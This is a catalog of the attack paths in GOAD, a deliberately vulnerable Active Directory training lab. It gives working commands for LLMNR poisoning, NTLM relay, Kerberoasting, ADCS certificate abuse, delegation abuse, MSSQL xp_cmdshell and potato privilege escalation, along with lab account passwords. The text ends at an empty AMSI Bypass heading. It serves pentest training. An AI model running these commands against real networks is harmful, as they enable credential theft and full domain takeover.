# GOAD Vulnerability Catalog

**GOAD** is a vulnerable Active Directory penetration testing lab by Mayfly (Orange Cyberdefense). This document catalogs all known vulnerabilities and attack paths in the lab.

**Lab Architecture:**

- Multi-domain setup with parent/child relationships
- Three forests: `sevenkingdoms.local`, `north.sevenkingdoms.local` (child), and `essos.local`
- Multiple servers including Domain Controllers, IIS, MSSQL, and ADCS servers
- Forest trusts between domains

**GOAD Lab-Specific Vulnerable Configurations:**
These scheduled tasks and configurations are provisioned by Ansible roles to enable attack scenarios:

| Configuration | Server | User | Frequency | Ansible Role | Attack Enabled |
| --------------- | -------- | ------ | ----------- | -------------- | ---------------- |
| Non-existent share connection | Winterfell | robb.stark | Every 1 minute | `roles/vulns/responder` | LLMNR/NBT-NS Poisoning |
| Non-existent share connection | Kingslanding | eddard.stark (Domain Admin) | Every 5 minutes | `roles/vulns/ntlm_relay` | NTLM Relay |
| AS-REP Roastable account | - | brandon.stark | - | Account settings | AS-REP Roasting |
| SMB Signing disabled | Winterfell | - | - | Server config | NTLM Relay target |
| IIS upload vulnerability | 192.168.56.22 | - | - | IIS config | Web shell upload |

**Key Vulnerable Accounts:**

- **robb.stark** - Local admin on Winterfell, password in rockyou.txt (NetNTLMv2 capture)
- **brandon.stark** - AS-REP roastable, password: `iseedeadpeople`
- **eddard.stark** - Domain Admin, enables NTLM relay to domain compromise
- **samwell.tarly** - Password in description field: `Heartsbane`
- **hodor** - Password equals username: `hodor`
- **jon.snow** - Kerberoastable, password: `iknownothing`

---

## Table of Contents

1. [Initial Access & Reconnaissance](#initial-access--reconnaissance)
2. [Credential Discovery](#credential-discovery)
3. [Network Poisoning & Relay Attacks](#network-poisoning--relay-attacks)
4. [Kerberos Attacks](#kerberos-attacks)
5. [Active Directory Certificate Services (ADCS) Vulnerabilities](#adcs-vulnerabilities)
6. [ACL Abuse & Permission Exploitation](#acl-abuse--permission-exploitation)
7. [Delegation Attacks](#delegation-attacks)
8. [MSSQL Exploitation](#mssql-exploitation)
9. [Privilege Escalation](#privilege-escalation)
10. [Lateral Movement](#lateral-movement)
11. [Domain Trust Exploitation](#domain-trust-exploitation)
12. [User-Level Attacks](#user-level-attacks)
13. [CVE Exploits](#cve-exploits)

---

## Initial Access & Reconnaissance

### Anonymous Enumeration

**Vulnerability:** NULL session access to SMB services

- **Affected Systems:** WINTERFELL DC, various servers
- **Impact:** Unauthenticated user enumeration, group discovery, share access
- **Tools:** crackmapexec, enum4linux, rpcclient, smbclient
- **Exploitation:**

  ```bash
  cme smb 192.168.56.11 --users
  rpcclient -U "" -N <target>
  enumdomusers
  ```

### SMB Signing Disabled

**Vulnerability:** SMB signing not enforced

- **Affected Systems:** CASTELBLACK, BRAAVOS (workstations)
- **Impact:** Enables NTLM relay attacks
- **Configuration Issues:**
  - CASTELBLACK: "signing enabled but not required"
  - BRAAVOS: "message signing disabled (dangerous, but default)"

### Exposed Services

**Vulnerability:** Critical services accessible without security hardening

- **Services Identified:**
  - DNS (port 53) - Domain enumeration
  - Kerberos (port 88) - Ticket-based attacks
  - LDAP (ports 389, 636, 3268, 3269) - Directory enumeration
  - SMB (port 445) - File share and lateral movement
  - RDP (port 3389) - Remote access entry points
  - SQL Server (port 1433) - Database attacks
  - WinRM (ports 5985-5986) - Remote command execution

### DNS Enumeration

**Vulnerability:** Internal DNS records exposed

- **Tools:** adidnsdump
- **Impact:** Discovery of internal hosts and services

---

## Credential Discovery

### Password in User Description Field

**Vulnerability:** Plaintext passwords stored in user description attribute

- **Affected Account:** samwell.tarly
- **Password:** Heartsbane
- **Discovery Method:** LDAP enumeration, rpcclient
- **Impact:** Immediate authenticated access

### Weak Password Policy

**Vulnerability:** Insufficient password complexity requirements

- **Configuration:**
  - No complexity requirements in NORTH domain
  - Only 5 failed attempt lockout threshold
  - Short minimum password length
- **Impact:** Enables password spraying attacks

### Username=Password Combinations

**Vulnerability:** Users with passwords matching their usernames

- **Discovered Accounts:**
  - hodor:hodor
  - localuser (identical passwords across all three domains)
- **Discovery Method:** Password spraying

### Cross-Domain Password Reuse

**Vulnerability:** Identical passwords used across trusted domains

- **Affected Account:** localuser account with Domain Admin privileges
- **Impact:** Single credential grants admin access to multiple domains
- **Attack Path:** Dump NORTH domain hashes → spray against SEVENKINGDOMS and ESSOS

---

## Network Poisoning & Relay Attacks

### LLMNR/mDNS/NBT-NS Poisoning

**Vulnerability:** Broadcast name resolution protocols enabled

- **GOAD Context:** Winterfell runs scheduled task as robb.stark every minute, attempting to connect to a non-existent share (configured in `roles/vulns/responder`)
- **Tool:** Responder
- **Captured Credentials:** robb.stark (NetNTLMv2 hash, crackable with rockyou.txt)
- **Exploitation:**

  ```bash
  # Start Responder on lab network interface
  responder -I eth0 -wrf

  # Wait up to 1 minute for robb.stark's scheduled task
  # Capture NetNTLMv2 hash

  # Crack with hashcat
  hashcat -m 5600 robb_stark_hash.txt rockyou.txt

  # Or with John
  john robb_stark_hash.txt --wordlist=rockyou.txt
  ```

- **Result:** robb.stark is local admin on Winterfell - enables further lateral movement
- **Impact:** Credential capture from network authentication

### NTLMv1 Downgrade Attack

**Vulnerability:** Systems accept NTLMv1 authentication

- **Configuration:** Responder with predictable challenge "1122334455667788"
- **Impact:** Hashes crackable via online services (crack.sh)

### NTLM Relay to SMB

**Vulnerability:** Unsigned SMB on workstations

- **GOAD Context:** Kingslanding runs scheduled task as eddard.stark (Domain Admin) every 5 minutes connecting to non-existent share. Winterfell has SMB signing disabled.
- **Find Unsigned SMB Hosts:**

  ```bash
  cme smb 192.168.56.0/24 --gen-relay-list relay_targets.txt
  ```

- **Attack Chain:**
  1. Disable Responder's SMB/HTTP servers in `/usr/share/responder/Responder.conf`
  2. Start Responder to poison LLMNR/NBT-NS: `responder -I eth0 -v`
  3. Relay captured authentication to unsigned SMB hosts
- **Basic Relay (single command):**

  ```bash
  impacket-ntlmrelayx -t 192.168.56.11 -smb2support -c "whoami"
  ```

- **SOCKS Proxy Relay (persistent access):**

  ```bash
  # Start relay with SOCKS
  impacket-ntlmrelayx -t 192.168.56.11 -smb2support -socks

  # In ntlmrelayx console, type 'socks' to see active sessions
  # Use proxychains with any tool
  proxychains cme smb 192.168.56.11 -d 'SEVENKINGDOMS' -u 'eddard.stark' -p '' --sam
  proxychains secretsdump.py 'SEVENKINGDOMS/eddard.stark'@192.168.56.11
  proxychains lsassy -d SEVENKINGDOMS -u eddard.stark -p '' 192.168.56.11
  ```

- **Proxychains Config:** Edit `/etc/proxychains4.conf` - change port to 1080 (ntlmrelayx default) instead of 9050 (Tor default)
- **Targets:** Winterfell (SMB signing disabled)
- **Tools:** ntlmrelayx, Responder, proxychains, secretsdump, lsassy

### NTLM Relay to LDAPS

**Vulnerability:** LDAP signing not enforced + RBCD misconfiguration

- **Attack Chain:**
  1. Poison/coerce authentication
  2. Relay to LDAPS
  3. Create computer accounts with RBCD permissions
  4. Impersonate domain admin
- **Tools:** ntlmrelayx, rbcd.py

### MITM6 DHCPv6 Poisoning

**Vulnerability:** Windows prefers IPv6 over IPv4 by default

- **Attack Vector:** Respond to DHCPv6 queries with malicious DNS server
- **Impact:** Redirect WPAD queries, capture credentials
- **Tool:** mitm6

### CVE-2019-1040 (Remove-MIC)

**Vulnerability:** NTLM MIC removal bypass

- **Attack Chain:**
  1. Force DC authentication via PrinterBug/PetitPotam
  2. Relay SMB-to-LDAPS using remove-mic bypass
  3. Bypass signing requirements
- **Impact:** Domain compromise

---

## Kerberos Attacks

### AS-REP Roasting

**Vulnerability:** Users with "Do not require Kerberos preauthentication" flag

- **Affected Accounts:** brandon.stark
- **Cracked Password:** iseedeadpeople
- **Discovery Methods:**
  - **PowerView:** `Get-DomainUser -PreauthNotRequired -Properties distinguishedname`
  - **AD Module:** `Get-ADuser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True"}`
  - **Impacket:** `GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP`
- **Exploitation:**

  ```bash
  # Linux - Impacket
  GetNPUsers.py north.sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.56.11
  GetNPUsers.py north.sevenkingdoms.local/brandon.stark -dc-ip 192.168.56.11 -no-pass -format hashcat

  # Windows - Rubeus (auto-discovers AS-REP roastable accounts)
  Rubeus.exe asreproast /format:hashcat

  # Crack the hash
  hashcat -m 18200 asrep_hashes.txt wordlist.txt
  john asrep_hashes.txt --wordlist=rockyou.txt
  ```

- **Note:** Does not increase badpwdcount (no lockout risk)
- **Offensive Tip:** With GenericWrite/GenericAll on a user, you can enable "Do not require Kerberos preauthentication" via userAccountControl modification, then AS-REP roast them

### Kerberoasting

**Vulnerability:** Service accounts with SPNs set

- **Affected Accounts:**
  - jon.snow (CIFS/HTTP services) - Password: "iknownothing"
  - sansa.stark (HTTP service, unconstrained delegation)
  - sql_svc (MSSQL service)
- **Tools:** GetUserSPNs.py, hashcat (mode 13100)
- **Exploitation:**

  ```bash
  GetUserSPNs.py north.sevenkingdoms.local/user:password -dc-ip 192.168.56.11 -request
  hashcat -m 13100 tgs_hashes.txt wordlist.txt
  ```

### Targeted Kerberoasting

**Vulnerability:** GenericWrite on user objects allows adding SPNs

- **Attack Chain:**
  1. Identify users with GenericWrite permissions
  2. Add SPN to target user account
  3. Request TGS ticket
  4. Crack offline
- **Tools:** bloodyAD, targetedKerberoast.py

### Kerberos User Enumeration

**Vulnerability:** Username validation via Kerberos pre-authentication

- **Method:** Nmap krb5-enum-users script
- **Error Responses:**
  - Invalid user: `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`
  - Valid user: `KRB5KDC_ERR_PREAUTH_REQUIRED` or TGT response
- **Impact:** Username enumeration without lockout

---

## ADCS Vulnerabilities

### ESC1 - Enrollee Supplies Subject

**Vulnerability:** Certificate templates allow requesters to specify Subject Alternative Name

- **Requirements:**
  - Template allows "Enrollee Supplies Subject"
  - Client authentication EKU enabled
- **Exploitation:**

  ```bash
  certipy req -u user@domain -p password -ca CA-NAME -template TEMPLATE -upn administrator@domain
  ```

- **Impact:** Request certificates for any user including domain admins

### ESC2 - Any Purpose EKU

**Vulnerability:** Certificate templates with "Any Purpose" EKU or no EKU

- **Impact:** Certificate can be used for authentication, code signing, or any purpose
- **Exploitation:** Similar to ESC3, can be used for Certificate Request Agent abuse

### ESC3 - Certificate Request Agent

**Vulnerability:** Templates with Certificate Request Agent EKU

- **Attack Chain:**
  1. Request agent certificate
  2. Use agent certificate to request certificates on behalf of other users
  3. Request certificate for domain admin
- **Impact:** Privilege escalation to domain admin

### ESC4 - Vulnerable Certificate Template Access Control

**Vulnerability:** GenericWrite/GenericAll permissions on certificate templates

- **Attack Chain:**
  1. Identify writeable certificate templates
  2. Modify template settings to enable ESC1
  3. Request malicious certificate
- **Tools:** Certipy, bloodyAD
- **Exploitation:**

  ```bash
  certipy template -u user@domain -p password -template TEMPLATE -save-old
  # Modify template settings
  certipy req -u user@domain -p password -ca CA-NAME -template TEMPLATE -upn admin@domain
  ```

### ESC5 - Golden Certificate & PKI Object Access Control

**Vulnerability:** Compromise of Certificate Authority server or PKI AD objects

**Golden Certificate Attack:**

- **Requirements:** CA server compromise (local admin on CA)
- **Attack Paths:**
  - **SCHANNEL:** Extract CA cert/key → forge certificate → LDAP shell
  - **PKINIT:** Extract CA cert/key → forge certificate → Kerberos authentication
- **Tools:** Certipy, SharpDPAPI
- **Exploitation:**

  ```bash
  # Backup CA certificate and private key
  certipy ca -backup -u user@domain -p password -ca CA-NAME

  # Forge administrator certificate
  certipy forge -ca-pfx ca.pfx -upn administrator@domain -subject 'CN=Administrator'

  # Authenticate using forged certificate
  certipy auth -pfx forged.pfx -dc-ip DC_IP
  ```

- **Impact:** Forge certificates for any user, persistent domain compromise

**PKI Object Access Control:**

- **Vulnerability:** Excessive permissions on PKI container objects in AD
- **Scenario:** If SYSTEM (or compromised principal) has Full Control on parent domain's Public Key Services Container
- **Attack Path:** Child domain compromise → modify CA objects in parent domain → escalate to parent domain
- **Impact:** Cross-domain privilege escalation via ADCS infrastructure

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability:** CA configured with `EDITF_ATTRIBUTESUBJECTALTNAME2` flag

- **Impact:** Any template can be used to request certificates with arbitrary SANs
- **Detection:** `certipy find -vulnerable`
- **Exploitation:** Request certificate with `-upn` flag for any template

### ESC7 - ManageCA/ManageCertificate Abuse

**Vulnerability:** ManageCA privileges can be escalated to issue arbitrary certificates

- **Requirements:** ManageCA privileges on Certificate Authority
- **Attack Chain:**
  1. Add yourself as officer (ManageCertificates permission):

     ```bash
     certipy ca -ca 'CA-NAME' -add-officer attacker -u user@domain -p password
     ```

  2. Enable vulnerable template (e.g., SubCA):

     ```bash
     certipy ca -ca 'CA-NAME' -enable-template SubCA -u user@domain -p password
     ```

  3. Request certificate with forged UPN (will be pending):

     ```bash
     certipy req -u user@domain -p password -ca CA-NAME -template SubCA -upn administrator@domain
     ```

  4. Issue the pending request using your officer privileges:

     ```bash
     certipy ca -ca 'CA-NAME' -issue-request REQUEST_ID -u user@domain -p password
     ```

  5. Retrieve the issued certificate:

     ```bash
     certipy req -u user@domain -p password -ca CA-NAME -retrieve REQUEST_ID
     ```

  6. Authenticate as administrator:

     ```bash
     certipy auth -pfx administrator.pfx -dc-ip DC_IP
     ```

- **Impact:** Domain compromise through arbitrary certificate issuance

### ESC8 - NTLM Relay to AD CS HTTP Endpoints

**Vulnerability:** Web enrollment service accepts NTLM authentication without EPA/signing

- **Attack Chain:**
  1. Coerce DC authentication (PetitPotam, Coercer)
  2. Relay to ADCS web enrollment (HTTP/HTTPS)
  3. Request DC certificate
  4. Use certificate for authentication
- **Tools:** ntlmrelayx, petitpotam, certipy
- **Exploitation:**

  ```bash
  ntlmrelayx.py -t http://adcs.domain/certsrv/certfnsh.asp -smb2support --adcs
  python3 PetitPotam.py attacker-ip dc-ip
  ```

- **Variant:** Kerberos relay with self-coercion via DNS manipulation

### ESC9 - UPN Spoofing with No Security Extension

**Vulnerability:** Certificate template with `CT_FLAG_NO_SECURITY_EXTENSION` (0x00080000) flag

- **Prerequisites:**
  - GenericWrite on target account
  - `msPKI-EnrollmentFlag` contains `CT_FLAG_NO_SECURITY_EXTENSION`
  - `StrongCertificateBindingEnforcement=1` or `CertificateMappingMethods=0x04`
- **Attack Chain:**
  1. Add shadow credentials to target to obtain their hash:

     ```bash
     certipy shadow auto -u attacker@domain -p password -account target
     ```

  2. Modify target's UPN to administrator:

     ```bash
     # Using bloodyAD or similar
     bloodyAD -u attacker -p password -d domain set object target userPrincipalName -v administrator@domain
     ```

  3. Request certificate using target's credentials:

     ```bash
     certipy req -u target@domain -hashes :HASH -ca CA-NAME -template VulnerableTemplate
     ```

  4. Restore original UPN
  5. Authenticate with forged certificate
- **Impact:** Privilege escalation via certificate-based authentication

### ESC10 - Weak Certificate Mapping

**Vulnerability:** Certificate mapping bypass allowing authentication as any user

- **Case 1 (StrongCertificateBindingEnforcement=0):**
  1. Modify target user's UPN to "administrator"
  2. Request certificate using target's hash
  3. Restore original UPN
  4. Authenticate as administrator with certificate
- **Case 2 (CertificateMappingMethods=0x04):**
  1. Modify target UPN to computer account format: `computername$@domain`
  2. Request certificate
  3. Restore UPN
  4. Authenticate via LDAP shell for computer account access
- **Requirements:** GenericWrite on target account
- **Tools:** certipy, bloodyAD

### ESC11 - RPC Encryption Weakness

**Vulnerability:** Encryption not enforced for ICPR (MS-ICPR) RPC requests

- **Difference from ESC8:** Uses RPC instead of HTTP for relay
- **Requirements:** CA allows RPC connections without encryption enforcement
- **Attack Chain:**
  1. Set up RPC relay:

     ```bash
     ntlmrelayx.py -t rpc://CA-IP -rpc-mode ICPR -icpr-ca-name CA-NAME --adcs
     ```

  2. Coerce DC authentication via RPC:

     ```bash
     coercer.py -u user -p password -d domain -t DC-IP -l attacker-ip --rpc-mode
     ```

  3. Certificate issued for coerced principal
  4. Authenticate using obtained certificate
- **Impact:** Domain compromise via RPC-based relay (bypasses HTTP-focused defenses)

### ESC13 - Group Membership via Issuance Policy

**Vulnerability:** Certificate template with issuance policy linked to privileged group membership

- **Scenario:** Template allows domain users to enroll, and the issued certificate grants membership in a privileged group (e.g., "greatmaster" → admin privileges)
- **Detection:** Identify templates where enrollment grants extended rights or group memberships
- **Attack Chain:**
  1. Enumerate templates with dangerous issuance policies:

     ```bash
     certipy find -vulnerable -u user@domain -p password
     ```

  2. Request certificate from vulnerable template:

     ```bash
     certipy req -u user@domain -p password -ca CA-NAME -template VulnerableTemplate
     ```

  3. Authenticate and inherit group privileges:

     ```bash
     certipy auth -pfx user.pfx -dc-ip DC_IP
     ```

- **Impact:** Unintended privilege escalation through certificate issuance policies

### ESC14 - AltSecurityIdentities Manipulation

**Vulnerability:** Write access to target's `altSecurityIdentities` attribute enables certificate mapping

- **Requirements:** GenericWrite/WriteDacl on target user object
- **Attack Chain:**
  1. Create machine account with specific DNS hostname:

     ```bash
     addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Pass123' domain/user:password
     # Set dnsHostName for the computer account
     ```

  2. Request Machine template certificate for your computer:

     ```bash
     certipy req -u 'YOURPC$'@domain -p 'Pass123' -ca CA-NAME -template Machine
     ```

  3. Calculate X509IssuerSerialNumber from certificate:

     ```bash
     openssl x509 -in cert.pem -noout -issuer -serial
     # Format: X509:<I>DC=domain,DC=local,CN=CA-NAME<SR>SERIALNUMBER
     ```

  4. Modify target's altSecurityIdentities attribute:

     ```bash
     # Using ldeep or similar LDAP tool
     ldeep ldap -u user -p password -d domain modify "CN=target,CN=Users,DC=domain,DC=local" \
       add altSecurityIdentities "X509:<I>DC=domain,DC=local,CN=CA-NAME<SR>SERIAL"
     ```

  5. Authenticate as target using your certificate via PKINIT:

     ```bash
     certipy auth -pfx yourpc.pfx -dc-ip DC_IP -domain domain.local
     ```

- **Impact:** Account takeover via certificate mapping without password knowledge

### ESC15 (CVE-2024-49019) - Certificate Request Agent Abuse

**Vulnerability:** Certificate Request Agent application policy enables delegation abuse

- **Requirements:** Access to template with "Certificate Request Agent" EKU/application policy
- **Attack Chain:**
  1. Request certificate with Certificate Request Agent policy:

     ```bash
     certipy req -u user@domain -p password -ca CA-NAME -template AgentTemplate
     ```

  2. Use agent certificate to request certificate on behalf of administrator:

     ```bash
     certipy req -u user@domain -p password -ca CA-NAME -template User \
       -on-behalf-of 'domain\\administrator' -pfx agent.pfx
     ```

  3. Authenticate as administrator:

     ```bash
     certipy auth -pfx administrator.pfx -dc-ip DC_IP
     ```

- **Impact:** Privilege escalation to any user including domain admin
- **Patched:** November 12, 2024

### Certifried (CVE-2022-26923)

**Vulnerability:** Computer account DNS hostname spoofing

- **Attack Chain:**
  1. Create computer account (MAQ=10 by default)
  2. Set dNSHostName to match domain controller
  3. Request computer certificate
  4. Certificate issued for DC identity
  5. Authenticate as DC
- **Tools:** Certipy, impacket
- **Impact:** Domain compromise via DC impersonation

### Shadow Credentials (ADCS-related)

**Vulnerability:** GenericWrite/GenericAll on user/computer objects

- **Attack Chain:**
  1. Add KeyCredentialLink to target account
  2. Generate PKINIT certificate
  3. Request TGT using certificate
  4. Authenticate as target
- **Tools:** Pywhisker, Whisker
- **Exploitation:**

  ```bash
  pywhisker.py -d domain -u user -p password --target targetuser --action add
  ```

---

## ACL Abuse & Permission Exploitation

### ForceChangePassword

**Vulnerability:** Reset password permission on user objects

- **Impact:** Direct password reset without knowledge of current password
- **Warning:** Should not be used in real pentests (disruptive)
- **Tools:** bloodyAD, net rpc password

### GenericWrite on Users

**Vulnerability:** Full write access to user object attributes

- **Attack Vectors:**
  1. **Targeted Kerberoasting:** Add SPN → request TGS → crack offline
  2. **Shadow Credentials:** Add msDS-KeyCredentialLink → PKINIT authentication
  3. **LogonScript modification:** Set scriptpath → execute code on logon
  4. **ProfilePath manipulation:** Force NetNTLMv2 authentication capture
- **Tools:** bloodyAD, PowerView, targetedKerberoast.py

### WriteDacl

**Vulnerability:** Modify access control entries on objects

- **Attack Chain:**
  1. Identify WriteDacl permission
  2. Grant additional rights (e.g., FullControl)
  3. Execute further attacks
- **Tools:** dacledit.py, PowerView
- **Exploitation:**

  ```bash
  dacledit.py -action write -rights FullControl -principal attacker -target-dn "CN=Target,DC=domain" domain/user:password
  ```

### WriteOwner on Groups

**Vulnerability:** Change ownership of group objects

- **Attack Chain:**
  1. Change group ownership to attacker-controlled account
  2. Modify DACL to grant full control
  3. Add members to privileged group
- **Impact:** Group membership manipulation

### AddMember/AddSelf

**Vulnerability:** Permission to add members to groups without approval

- **Common Targets:** Domain Admins, high-privilege groups
- **Tools:** net rpc group addmem, bloodyAD

### GenericAll on Users

**Vulnerability:** Complete control over user objects

- **Capabilities:**
  - Password changes
  - Shadow credentials
  - Full account takeover
- **Impact:** Immediate privilege escalation

### GenericAll on Computers

**Vulnerability:** Complete control over computer objects

- **Attack Vectors:**
  1. Shadow credentials for machine account
  2. RBCD configuration
  3. LAPS password reading (if configured)
- **Impact:** System-level access to target computer

### GPO Abuse (WriteDacl/GenericWrite on GPO)

**Vulnerability:** Write permissions on Group Policy Objects

- **Attack Chain:**
  1. Identify writable GPO
  2. Inject scheduled task executing arbitrary code as SYSTEM
  3. Wait for GPO refresh or force with `gpupdate`
- **Tools:** SharpGPOAbuse, bloodyAD
- **Impact:** Code execution as SYSTEM on all computers in GPO scope

### LAPS Password Reading

**Vulnerability:** Read access to ms-Mcs-AdmPwd attribute

- **Requirements:** Proper permissions on computer objects
- **Tools:** crackmapexec, ldapsearch, bloodyAD
- **Impact:** Local administrator password disclosure

### ACL Attack Chain Example

**Sevenkingdoms.local killchain:**

```text
Tywin
  → Jaime (ForceChangePassword)
  → Joffrey (GenericWrite/Kerberoasting)
  → Tyron (Shadow Credentials)
  → Small Council group (AddSelf)
  → DragonStone group (AddMember)
  → Kingsguard group (WriteOwner)
  → Stannis user (GenericAll)
  → Kingslanding DC (GenericAll on Computer/RBCD)
```

---

## Delegation Attacks

### Unconstrained Delegation

**Vulnerability:** Accounts configured with unconstrained delegation cache all TGTs

- **Default Configuration:** All domain controllers have unconstrained delegation
- **Attack Chain:**
  1. Identify unconstrained delegation accounts (BloodHound query: `unconstraineddelegation:true`)
  2. Compromise account with unconstrained delegation
  3. Coerce DC authentication (PetitPotam, Coercer, PrinterBug)
  4. Extract cached DC TGT from memory
  5. Use TGT for DCSync
- **Tools:** Rubeus, klist, Coercer, secretsdump
- **Exploitation:**

  ```bash
  # Windows
  Rubeus.exe triage
  Rubeus.exe dump /luid:0x3e7 /service:krbtgt

  # Linux (after TGT extraction)
  export KRB5CCNAME=dc_tgt.ccache
  secretsdump.py -k dc.domain.local -just-dc
  ```

- **Impact:** Full domain compromise via DCSync

### Constrained Delegation (With Protocol Transition)

**Vulnerability:** S4U2Self + S4U2Proxy allows impersonation

- **Configuration:** `TRUSTED_TO_AUTH_FOR_DELEGATION` + `msDS-AllowedToDelegateTo`
- **Attack Chain:**
  1. Identify accounts with constrained delegation
  2. Use S4U2Self to obtain forwardable ticket for any user
  3. Use S4U2Proxy to access target service
  4. Modify SPN if needed (`/altservice` flag)
- **Tools:** Rubeus, getST.py
- **Exploitation:**

  ```bash
  # Linux
  getST.py -spn 'cifs/dc.domain.local' -impersonate administrator domain/delegated_user:password
  export KRB5CCNAME=administrator.ccache
  secretsdump.py -k dc.domain.local -just-dc
  ```

- **Key Feature:** Can impersonate privileged users to access target SPNs

### Constrained Delegation (Without Protocol Transition)

**Vulnerability:** Requires forwardable tickets but can be bypassed

- **Limitation:** Cannot perform S4U2Self (needs forwardable tickets)
- **Bypass:** RBCD workaround
  1. Create intermediary computer account
  2. Configure RBCD on intermediary
  3. Execute S4U2Self/S4U2Proxy chain
  4. Modify service names as needed
- **Impact:** Similar to standard constrained delegation

### Resource-Based Constrained Delegation (RBCD)

**Vulnerability:** Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity`

- **Requirements:**
  - GenericAll/GenericWrite on computer object
  - Ability to create machine accounts (MAQ=10 by default)
- **Attack Chain:**
  1. Create attacker-controlled computer account
  2. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target
  3. Perform S4U2Self to get forwardable ticket
  4. Perform S4U2Proxy to impersonate admin on target
  5. Gain admin access to target system
- **Tools:** rbcd.py, addcomputer.py, getST.py
- **Exploitation:**

  ```bash
  # Create computer account
  addcomputer.py -computer-name 'EVILPC$' -computer-pass 'P@ssw0rd' domain/user:password

  # Configure RBCD
  rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action write domain/user:password

  # Request tickets
  getST.py -spn 'cifs/target.domain.local' -impersonate administrator -dc-ip 192.168.56.11 domain/'EVILPC$':'P@ssw0rd'

  # Use ticket
  export KRB5CCNAME=administrator.ccache
  secretsdump.py -k target.domain.local
  ```

- **Impact:** Administrator access to target computers

### Machine Account Quota (MAQ)

**Vulnerability:** Default setting allows domain users to create 10 computer objects

- **Default Value:** `ms-DS-MachineAccountQuota = 10`
- **Impact:** Enables RBCD, DNS spoofing, and Kerberos relay attacks
- **Discovery:** `crackmapexec ldap dc.domain.local -u user -p password -M maq`

---

## MSSQL Exploitation

### Login Impersonation (EXECUTE AS LOGIN)

**Vulnerability:** Users with impersonation privileges can assume identity of other logins

- **Example:** samwell.tarly impersonating sa login
- **Attack Chain:**
  1. Enumerate impersonation permissions
  2. Execute commands as privileged login
  3. Enable xp_cmdshell if needed
  4. Execute OS commands
- **Tools:** mssqlclient.py, PowerUpSQL
- **Exploitation:**

  ```sql
  EXECUTE AS LOGIN = 'sa';
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```

### User Impersonation (EXECUTE AS USER)

**Vulnerability:** Database-level impersonation of dbo user

- **Requirements:** Database "trustworthy" property enabled
- **Example:** arya.stark impersonating dbo in msdb
- **Impact:** Elevated database privileges

### NTLM Coercion from MSSQL

**Vulnerability:** MSSQL can coerce NTLM authentication

- **Methods:**
  - `xp_dirtree '\\attacker-ip\share'`
  - `xp_fileexist '\\attacker-ip\share'`
  - `xp_subdirs '\\attacker-ip\share'`
- **Impact:** Capture machine account NetNTLM hash for relay attacks
- **Tools:** Responder, ntlmrelayx

### MSSQL Trusted Linked Servers

**Vulnerability:** SQL Server links between database instances

- **Attack:** Chain queries across linked servers to pivot between systems
- **Exploitation:**

  ```sql
  SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');
  EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
  ```

- **Impact:** Command execution across multiple database servers, cross-domain pivoting

### Command Execution via xp_cmdshell

**Vulnerability:** Extended stored procedure for OS command execution

- **Requirements:** Administrative access or impersonation
- **Default:** Usually disabled, but can be enabled
- **Impact:** Direct operating system command execution as SQL Server service account

### Trustworthy Database Setting

**Vulnerability:** Database property determining impersonation scope

- **Risk:** Allows database-level impersonation to escalate to instance-level
- **Detection:** `SELECT name, is_trustworthy_on FROM sys.databases;`

---

## Privilege Escalation

### SeImpersonatePrivilege Exploitation

**Vulnerability:** Service accounts (IIS, MSSQL) have SeImpersonate privilege by default

- **Tools:** PrintSpoofer, SweetPotato, BadPotato, JuicyPotato, RoguePotato, GodPotato
- **Exploitation Techniques:**
  - **PrintSpoofer:** Abuses the Print Spooler service to impersonate SYSTEM

    ```powershell
    PrintSpoofer.exe -i -c cmd
    PrintSpoofer.exe -c "C:\path\to\reverse_shell.bat"
    ```

  - **SweetPotato:** Unified "potato" technique that defaults to PrintSpoofer
    - Creates temporary directory and loads binary via `Assembly.Load()` into PowerShell
    - Executes batch file containing reverse shell commands

    ```powershell
    # In-memory loading via PowerSharpPack
    Invoke-SweetPotato -Command "C:\temp\shell.bat"
    ```

  - **BadPotato:** Alternative when other potatoes are detected
    - Requires AMSI bypass before execution due to Defender detection
    - Can be loaded via PowerSharpPack wrapper

    ```powershell
    # AMSI bypass required first
    Invoke-BadPotato -Command "cmd /c whoami"
    ```

- **Common Trigger:** Web shells on IIS provide initial SeImpersonate context
- **Impact:** Escalation from service account (IIS AppPool, SQL Service) to SYSTEM privileges

### KrbRelayUp

**Vulnerability:** Kerberos relay when LDAP signing not enforced

- **Requirements Verification:**
  - **LDAP Signing:** Check with CME module: `cme ldap DC_IP -u user -p pass -M ldap-signing`
  - **Machine Account Quota (MAQ):** `cme ldap DC_IP -u user -p pass -M maq` (default: 10)
- **Attack Chain:**
  1. **Add Computer Account:**

     ```bash
     addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123' domain/user:password
     ```

  2. **Extract Machine Account SID:**

     ```bash
     pywerview get-netcomputer -u user -p password -d domain --computername YOURPC
     ```

  3. **Launch KrbRelay with CLSID:**

     ```bash
     # Target LDAP service with specific CLSID
     KrbRelay.exe -spn ldap/DC.domain.local -clsid {CLSID} -rbcd YOURPC$
     ```

  4. **Configure RBCD:** KrbRelay automatically sets `msDS-AllowedToActOnBehalfOfOtherIdentity`
  5. **Request Impersonated Ticket:**

     ```bash
     # Using Impacket
     getST.py -spn cifs/target.domain.local -impersonate administrator domain/'YOURPC$':'Password123'

     # Using Rubeus (Windows)
     Rubeus.exe hash /password:Password123 /user:YOURPC$ /domain:domain.local
     Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt
     ```

  6. **Execute Commands:**

     ```bash
     wmiexec.py -k -no-pass domain/administrator@target.domain.local
     ```

- **Tools:** KrbRelayUp (all-in-one), KrbRelay, Rubeus, Impacket
- **Defender Note:** KrbRelay may evade Defender detection (as of writeup date)
- **Impact:** System-level privilege escalation from local service account

### AMSI Bypass

